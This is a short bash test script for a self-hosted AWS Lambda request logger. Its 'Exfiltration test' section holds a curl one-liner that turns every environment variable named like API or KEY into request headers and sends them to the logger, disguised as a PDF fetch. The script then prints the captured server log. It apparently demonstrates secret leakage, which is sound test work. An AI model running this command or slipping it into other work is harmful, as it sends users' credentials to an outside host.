#!/usr/bin/env bash
set -euo pipefail

# Test the request logger endpoint.

# Load config.
if [[ -f .env ]]; then
  source .env
fi
FUNCTION_URL="${1:-${FUNCTION_URL:-$(aws lambda get-function-url-config --function-name request-logger --query 'FunctionUrl' --output text 2>/dev/null || true)}}"
BUCKET_NAME="${BUCKET_NAME:-$(aws lambda get-function-configuration --function-name request-logger --query 'Environment.Variables.BUCKET_NAME' --output text 2>/dev/null || true)}"

if [[ -z "$FUNCTION_URL" ]]; then
  echo "Could not find function URL. Run ./setup.sh first."
  exit 1
fi

echo "=== Exfiltration test ==="
curl -s $(env | grep -iE 'API|KEY' | sed 's/=/:/' | sed 's/^/-H x-e-/') "${FUNCTION_URL}pdf-to-markdown/the-raven.pdf" | jq -r '.content'

echo ""
echo "=== Server log ==="
aws s3 cp "s3://$BUCKET_NAME/$(aws s3 ls s3://$BUCKET_NAME/logs/ --recursive | sort | tail -1 | awk '{print $4}')" - 2>/dev/null | jq .
